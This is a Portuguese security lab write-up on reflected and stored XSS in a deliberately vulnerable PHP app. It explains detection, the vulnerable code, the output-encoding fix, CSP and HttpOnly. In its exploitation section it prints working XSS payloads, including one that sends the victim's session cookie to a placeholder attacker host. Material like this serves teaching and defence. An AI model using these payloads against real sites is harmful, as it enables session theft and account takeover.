# 02 — Cross-Site Scripting (XSS)

| | |
|---|---|
| **Severidade** | Alta |
| **Onde** | `app/busca.php` (refletido) e `app/mural.php` (armazenado) |
| **Categoria** | OWASP Top 10 — A03:2021 Injection |

## Resumo

A aplicação devolve texto do usuário **direto no HTML, sem tratamento**. Se esse texto contém `<script>` (ou qualquer HTML), o navegador da vítima **executa** como se fosse código legítimo do site. Com isso o atacante roda JavaScript no contexto da vítima: roubar cookie/sessão, agir como ela, alterar a página, redirecionar.

É a mesma raiz do SQL Injection — **misturar dado com código** — só que aqui o "código" é HTML/JS e quem executa é o **navegador**, não o banco.

---

## 1. Os dois tipos

| | Refletido | Armazenado |
|---|---|---|
| Onde fica o payload | na URL / na requisição | salvo no banco |
| Quem é atingido | só quem abre o link preparado | **todo mundo** que abrir a página |
| Exemplo no lab | `busca.php?q=...` | `mural.php` |
| Gravidade | alta | mais alta (atinge todos, sem link) |

## 2. Como achar

Enviar um texto que seria HTML e ver se ele **volta cru** na página (olhando o código-fonte). Teste leve, sem script:

```
<b>teste</b>
```

Se o texto aparece **em negrito** em vez de mostrar os caracteres `<b>`, o site interpretou sua entrada como HTML → está injetável.

## 3. Como explorar

### 3a. Refletido (`busca.php`)

A página imprime o termo buscado sem tratar:

```php
<p>Resultados para: <b><?= $q ?></b></p>   // $q vai cru
```

Buscando por:

```html
<script>alert(document.cookie)</script>
```

o script é devolvido dentro do HTML e **executa no navegador**. Num ataque real, o atacante manda o link pronto pra vítima:

```
http://site/busca.php?q=<script>...</script>
```

### 3b. Armazenado (`mural.php`)

O recado é salvo e depois impresso cru:

```php
<?= $r['texto'] ?>   // texto do recado, sem tratamento
```

Publicando um recado com:

```html
<script>document.location='http://atacante/roubar?c='+document.cookie</script>
```

o script fica **guardado no banco**. A partir daí, **qualquer pessoa** que abrir o mural — incluindo um admin — executa o código e tem o cookie de sessão enviado pro atacante. Sem precisar clicar em link nenhum.

## 4. Impacto

- Roubo de cookie de sessão → o atacante entra como a vítima (inclusive admin).
- Ações em nome da vítima (trocar senha, postar, transferir).
- Alterar o conteúdo da página (phishing dentro do site real), keylogger em JS.
- No armazenado: atinge todos os visitantes automaticamente (efeito "worm").

## 5. Causa raiz

Jogar entrada do usuário no HTML sem **codificar a saída**:

```php
// VULNERÁVEL
<?= $q ?>
<?= $r['texto'] ?>
```

O navegador não tem como saber que aquilo era "dado" e não "marcação" — está tudo na mesma string de HTML.

## 6. Correção — codificar a saída (output encoding)

A regra: **todo dado que vem do usuário deve ser codificado na hora de exibir**. Em PHP isso é o `htmlspecialchars()`, que transforma os caracteres especiais do HTML em "texto visível":

| Vira | De | Pra |
|---|---|---|
| `<` | abre tag | `&lt;` |
| `>` | fecha tag | `&gt;` |
| `"` | aspa de atributo | `&quot;` |
| `&` | início de entidade | `&amp;` |

```php
// busca.php — CORRIGIDO
<p>Resultados para: <b><?= htmlspecialchars($q, ENT_QUOTES, 'UTF-8') ?></b></p>

// mural.php — CORRIGIDO
<?= htmlspecialchars($r['texto'], ENT_QUOTES, 'UTF-8') ?>
```

Agora `<script>` vira `&lt;script&gt;` → aparece como **texto na tela**, o navegador mostra os caracteres e **não executa**. O payload perde o poder.

> Mesma filosofia do prepared statement: não "bloquear caractere perigoso", e sim **tratar o dado sempre como dado**, nunca como código. A diferença é o lugar — SQLi se resolve ao falar com o **banco**; XSS se resolve ao escrever no **navegador**.

### Detalhe importante: o tratamento é na SAÍDA, não na entrada

Pode guardar o texto no banco como veio. O que não pode é **exibir** sem codificar. Por quê? O mesmo dado pode ir pra lugares diferentes (HTML, atributo, JavaScript, URL) e cada lugar tem uma regra de escape própria. Codificar na hora de exibir, de acordo com o destino, é o certo.

### Defesa em profundidade

- **Content-Security-Policy (CSP):** cabeçalho que diz ao navegador "só execute script de origens X". Mesmo com um XSS, bloqueia script inline/externo não autorizado.
- **Cookie `HttpOnly`:** marca o cookie de sessão como inacessível ao JavaScript. Mesmo com XSS, o `document.cookie` não entrega a sessão.
- **Validação de entrada** como camada extra (ex.: campo que só deveria ter número), nunca como defesa única.

## 7. Validação da correção

Testado: o payload `<script>alert(1)</script>` passado por `htmlspecialchars()` vira `&lt;script&gt;alert(1)&lt;/script&gt;` na saída — renderiza como texto, não executa. A falha deixa de existir sem bloquear nenhum caractere.
